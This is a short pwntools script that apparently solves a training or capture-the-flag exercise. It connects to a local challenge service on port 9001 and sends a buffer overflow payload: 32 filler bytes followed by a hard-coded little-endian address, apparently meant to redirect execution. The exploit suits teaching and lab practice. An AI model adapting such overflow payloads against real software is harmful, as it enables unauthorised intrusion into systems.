#!/usr/bin/python

from pwn import *

def main():
    # Start a local process
    #p = process("../build/2_interactive")
    # p = remote("challenge_runner", 9001)
    p = remote("localhost", 9001)

    # Get rid of the prompt
    data1 = p.recvrepeat(0.2)
    log.info("Got data: %s" % data1)

    payload = "A" * 32 + "\xbb\x85\x04\x08"
    # Send the password
    p.sendline(payload)

    # Check for success or failure
    data2 = p.recvline(0.2)
    log.info("Got data: %s" % data2)

if __name__ == "__main__":
    main()